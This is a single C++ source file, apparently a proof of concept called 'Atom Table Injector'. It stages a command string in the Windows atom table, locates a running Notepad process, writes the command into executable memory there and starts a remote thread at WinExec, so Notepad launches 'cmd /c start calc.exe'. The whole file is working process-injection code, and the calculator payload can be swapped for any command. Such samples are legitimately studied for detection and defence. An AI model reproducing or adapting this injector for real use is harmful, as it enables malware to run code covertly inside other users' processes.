// Atom Table Injector: One-file C++ program to write, retrieve, and inject an Atom-based command ('cmd /c start calc.exe') into Notepad

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>

DWORD FindNotepadPID() {
    PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, L"notepad.exe") == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

int main() {
    // Step 1: Write command to Atom Table
    const char* cmd = "cmd /c start calc.exe";
    ATOM atom = AddAtomA(cmd);
    if (atom == 0) {
        std::cerr << "AddAtomA failed: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Atom created with ID: " << atom << std::endl;

    // Step 2: Retrieve the command from Atom Table
    char atomBuffer[256] = { 0 };
    if (GetAtomNameA(atom, atomBuffer, sizeof(atomBuffer)) == 0) {
        std::cerr << "[-] GetAtomNameA failed: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Retrieved command from Atom: " << atomBuffer << std::endl;

    // Step 3: Resolve WinExec address
    FARPROC winexecFn = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    if (!winexecFn) {
        std::cerr << "[-] Failed to resolve WinExec." << std::endl;
        return 1;
    }

    // Step 4: Find target process (Notepad)
    DWORD pid = FindNotepadPID();
    if (pid == 0) {
        std::cerr << "[-] Notepad not found." << std::endl;
        return 1;
    }
    std::cout << "[+] Found Notepad PID: " << pid << std::endl;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        std::cerr << "[-] Failed to open target process: " << GetLastError() << std::endl;
        return 1;
    }

    // Step 5: Allocate memory in target process and write Atom command
    SIZE_T len = strlen(atomBuffer) + 1;
    LPVOID remote_cmd = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_cmd) {
        std::cerr << "[-] VirtualAllocEx failed: " << GetLastError() << std::endl;
        CloseHandle(hProc);
        return 1;
    }

    if (!WriteProcessMemory(hProc, remote_cmd, atomBuffer, len, NULL)) {
        std::cerr << "[-] WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remote_cmd, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    // Step 6: Create remote thread to execute WinExec with Atom command
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)winexecFn, remote_cmd, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remote_cmd, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    std::cout << "[+] Atom command executed from Notepad." << std::endl;
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
